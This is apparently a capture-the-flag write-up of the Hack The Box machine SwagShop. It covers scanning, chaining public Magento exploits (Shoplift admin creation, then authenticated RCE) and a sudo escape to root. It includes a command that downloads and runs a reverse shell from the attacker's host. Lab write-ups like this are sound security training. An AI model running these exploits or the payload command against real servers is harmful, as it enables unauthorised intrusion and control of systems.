## Background

SwagShop is a retired vulnerable VM from Hack The Box.

## Information Gathering

Letâ€™s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.140 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-14 01:30:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.140                                    
Discovered open port 80/tcp on 10.10.10.140
```

Nothing unusual. Let's do one better with `nmap` scanning the discovered ports to establish the services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.140
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

```

The `http` service appears to be running an old version of Magento Community Edition (2014? Hello, it's 2019!). Sometimes it pays to look at the copyright notice down at the footer. Here's how it looks like.

Scroll down.

### Magento Community Edition 1.7.0.2

How do I know the version? Check out the release notes basically. The directory structure is also found in a GitHub repository [mirror](https://github.com/OpenMage/magento-mirror/tree/1.7.0.2) for older versions.


{% include image.html image_alt="a09563a1.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/a09563a1.png" %}


### Magento Shoplift Vulnerability

This particular version is susceptible to the Magento Shoplift vulnerability [discovered](https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) by Checkpoint in 2015.

Well, there's a readily available exploit, EDB-ID [37977](https://www.exploit-db.com/exploits/37977) for it. Running this exploit will grant access to the Admin Panel with credentials (`forme:forme`).

### Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution

This next exploit, EDB-ID [37811](https://www.exploit-db.com/exploits/37811) will allow us to execute remote commands. There are just two minor modifications to the exploit script.


{% include image.html image_alt="701cf120.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/701cf120.png" %}


We got the credentials from the previous exploit. The installation date can be obtained from `http://10.10.10.140/app/etc/local.xml` as suggested.


{% include image.html image_alt="4bfdeefa.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/4bfdeefa.png" %}


One last thing we need to know is the URL to the Admin Panel, which is `http://10.10.10.140/index.php/admin`. You can get a feel of the directory structure by navigating the site a bit, provided it doesn't give you `503`s :laugh:

## Low-Privilege Shell

I generate a reverse shell with `msfvenom`, host it with Python's SimpleHTTPServer, and also set up a `nc` listener. We then execute the exploit like so.

```
# python rce.py http://10.10.10.140/index.php/admin "wget -O/tmp/rev http://10.10.14.11/rev; chmod +x /tmp/rev; /tmp/rev"
```


{% include image.html image_alt="2654aa89.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/2654aa89.png" %}


It's customary to display `/etc/passwd`.


{% include image.html image_alt="a7d45ff6.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/a7d45ff6.png" %}


The file `user.txt` is in `haris`'s home directory and it can be disappointingly read by all.


{% include image.html image_alt="b11e7841.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/b11e7841.png" %}


## Privilege Escalation

Notice the `.sudo_as_admin_successful`?


{% include image.html image_alt="1859737a.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/1859737a.png" %}


This means that `haris` is able to `sudo` to a certain extent.


{% include image.html image_alt="4aaf3f8b.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/4aaf3f8b.png" %}


There you go, classic escape to `root` shell.


{% include image.html image_alt="6d2c05ad.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/6d2c05ad.png" %}


With that, getting `root.txt` is a breeze.


{% include image.html image_alt="87726194.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/87726194.png" %}


:dancer:

## Afterthought

What a neat idea to promote the SwagShop!
